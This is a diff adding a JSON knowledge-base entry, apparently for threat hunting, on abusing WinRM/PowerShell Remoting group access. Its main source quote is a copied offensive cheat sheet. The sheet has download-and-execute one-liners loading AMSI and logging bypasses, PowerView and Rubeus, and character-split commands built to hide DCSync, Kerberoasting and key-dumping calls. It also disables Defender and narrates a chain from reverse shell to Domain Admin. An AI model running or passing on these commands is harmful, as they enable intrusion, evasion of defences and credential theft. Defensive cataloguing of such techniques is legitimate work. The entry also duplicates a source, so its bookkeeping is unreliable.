@@ -1,0 +1,54 @@
+{
+ "class_id": "winrm",
+ "items": [
+  {
+   "item_key": "winrm.technique.tested_page_d597df76_f06a_49cb_a8bf_c33c2",
+   "kind": "technique",
+   "claim": "Where a privileged group is granted PowerShell Remoting access to a host, adding the account to that group is sufficient to obtain a remote session on the server with no credential of its own.",
+   "body": "Where a privileged group is granted PowerShell Remoting access to a host, adding the account to that group is sufficient to obtain a remote session on the server with no credential of its own.\n\nHackTricks reference: d597df76 (notion:d597df76-f06a-49cb-a8bf-c33c22bc0c03)",
+   "disproof": "After joining the group the PowerShell Remoting connection is refused or fails authorization, meaning the group carries no remoting rights on that host.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#d597df76-f06a-49cb-a8bf-c33c22bc0c03",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "page d597df76-f06a-49cb-a8bf-c33c22bc0c03\n\nPort Forwarding \n\nnetsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=8080 connectaddress=192.168.100.1 connectport=80\n\nPowerView\n\niex(iwr http://127.0.0.1:8080/sbloggingbypass.txt -UseBasicParsing);iex(iwr http://127.0.0.1:8080/amsibypass.txt -UseBasicParsing);iex(iwr http://127.0.0.1:8080/PowerView.ps1 -UseBasicParsing)\n\nPowerUp\n\niex(iwr http://127.0.0.1:8080/sbloggingbypass.txt -UseBasicParsing);iex(iwr http://127.0.0.1:8080/amsibypass.txt -UseBasicParsing);iex(iwr http://127.0.0.1:8080/PowerUp.ps1 -UseBasicParsing)\n\nLoader\n\nwget -Uri http://127.0.0.1:8080/Loader.exe -OutFile Loader.exe -UseBasicParsing\n\nasktgt PWN\n\nset \"z=t\"\nset \"y=g\"\nset \"x=t\"\nset \"w=k\"\nset \"v=s\"\nset \"u=a\"\nset \"Pwn=%u%%v%%w%%x%%y%%z%\"\n\nekeys PWN\n\nset \"z=s\"\nset \"y=y\"\nset \"x=e\"\nset \"w=k\"\nset \"v=e\"\nset \"u=:\"\nset \"t=:\"\nset \"s=a\"\nset \"r=s\"\nset \"q=l\"\nset \"p=r\"\nset \"o=u\"\nset \"n=k\"\nset \"m=e\"\nset \"l=s\"\nset \"Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\n\nDCSync PWN\n\nset \"z=c\"\nset \"y=n\"\nset \"x=y\"\nset \"w=s\"\nset \"v=c\"\nset \"u=d\"\nset \"t=:\"\nset \"s=:\"\nset \"r=p\"\nset \"q=m\"\nset \"p=u\"\nset \"o=d\"\nset \"n=a\"\nset \"m=s\"\nset \"l=l\"\nset \"Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\n\nKerberoasting PWN\n\nset \"z=t\"\nset \"y=s\"\nset \"x=a\"\nset \"w=o\"\nset \"v=r\"\nset \"u=e\"\nset \"t=b\"\nset \"s=r\"\nset \"r=e\"\nset \"q=k\"\nset \"Pwn=%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%\"\n\nLoader Kerberoasting\n\nLoader.exe -Path http://127.0.0.1:8080/Rubeus.exe -Args %Pwn% /simple /nowrap\n\nLoader asktgt\n\nLoader.exe -Path http://127.0.0.1:8080/Rubeus.exe -Args %Pwn% /user:serviceaccount /password:Password123 /domain:us.techcorp.local /ptt\n\nDisable Defender\n\nSet-MpPreference -DisableRealtimeMonitoring $true\n\nDuring the penetration test the penetration tester got access to a machine called examvm and got a user called studentuser after some enumeration the penetration tester found that the student user Generic Write on a group called \u201cCompanyAdministrators\u201d so the penetration tester added himself to the \u201cComapanyAdministrators\u201d and on checking the access of this group the penetration tester found the the \u201cCompanyAdministrators\u201d group members have Local Administrator access on the examvm machine so the penetration tester was now elevated to administrator after that the penetration tester dumped the memeory to find a username named \u201csharemanager\u201d and his password in Clear-Text format in memory the penetration tester logged in as the \u201csharemanager\u201d user and started enumerating the shares to find out that the sharemanager has access to a share named \u201dScheduledQueries\u201d on the \u201cSRV71\u201d server on checking the \u201dScheduledQueries\u201d share the penetration tester find a file named \u201cQueries.ps1\u201d which was a PowerShell script running every 5 mins on checking the access to this script it appears that the penetration tester can modify the script so he decided to put a malicious Reverse Shell in the file to get a connection back to him and after 5 mins the penetration tester gained access to the \u201cSRV71\u201d server and running as a user named \u201csqlconnector\u201d after deep enumeration the penetration tester found a MSSQL Instance on the \u201cGlacis.corp\u201d domain on testing the accessibility with the user \u201csqlconnector\u201d it turns out that we have access to the MSSQL Server the penetration tester then enumerated the users that could be impersonated and found two users which was \u201csqlsrva3dm\u201d and \u201csa\u201d the penetration tester impersonated those users and activated the \u201cxp_cmdshell\u201d function and gained remote code execution on the \u201csqlsrv3\u201d Server as \u201cnt authority\\system\u201d the penetration tester then dumped the credentials form the memory to find that there was a user named \u201cdbmaster\u201d and it\u2019s hash on enumeration it turs out the \u201cdbmaster\u201d user has constrained delegation on the \u201cglacis-dc\u201d so the penetration tester abused that and got access to the ldap service on the \u201cgalcis-dc\u201d on getting access to the ldap service the penetration tester performed the DCSync attack to retrive the hash of \u201cglavice\\Administrator\u201d and then OverPass-The-Hash to gain access as the \u201cAdministrator\u201d after that the penetration tester dumped the credentials from \u201cGlacis-dc\u201d and got the user \u201cglacis-dc$\u201d after enumeration the penetration tester found out that the \u201cglacis-dc$\u201d can add members to a group named \u201cpawadmins\u201d so the penetration tester added his \u201cstudentuser\u201d to \u201cpawadmins\u201d group on checking the PowerShell Remoting access the penetration tester got access to the \u201cpawsrv\u201d Server and on enumeration he found that the users of \u201cpawadmins\u2019 group have local admin access on \u201cpawsrv\u201d the penetration tester dumped the credentials and got the hash of \u201cpawsrv$\u201d on enumeration it turns out that the \u201cpawsrv$\u201d have DCSync rights on \u201ccitadel.corp\u201d the penetration tester performed the DCSync attack and extracted the hash of the user \u201cCitadel\\Administrator\u201d then the penetration tester OverPass-The-Hash as the \u201cAdministrator\u201d then PowerShell Remote to the \u201cCitadel-dc\u201d finally the penetration tester added the \u201cstudentuser\u201d to the \u201cDomain Admins\u201d group to maintain the access in the network"
+    },
+    {
+     "url": "https://learn.microsoft.com/en-us/windows/win32/winrm/portal",
+     "source_type": "research",
+     "host": "learn.microsoft.com",
+     "publisher": "microsoft.com",
+     "quote": "You can also obtain hardware and system data from WS-Management protocol implementations running on operating systems other than Windows in your enterprise. WinRM establishes a session with a remote computer through the SOAP-based WS-Management protocol rather than a connection through DCOM, as WMI does."
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1021/006/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services)."
+    },
+    {
+     "url": "https://attack.mitre.org/techniques/T1021/006/",
+     "source_type": "research",
+     "host": "attack.mitre.org",
+     "publisher": "mitre.org",
+     "quote": "WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services)."
+    }
+   ]
+  }
+ ],
+ "publishers": [
+  "microsoft.com",
+  "mitre.org",
+  "source-guide"
+ ],
+ "sources": [
+  "https://tested-corleggy-562.notion.site/?pvs=4#d597df76-f06a-49cb-a8bf-c33c22bc0c03",
+  "https://learn.microsoft.com/en-us/windows/win32/winrm/portal",
+  "https://attack.mitre.org/techniques/T1021/006/",
+  "https://attack.mitre.org/techniques/T1021/006/"
+ ]
+}
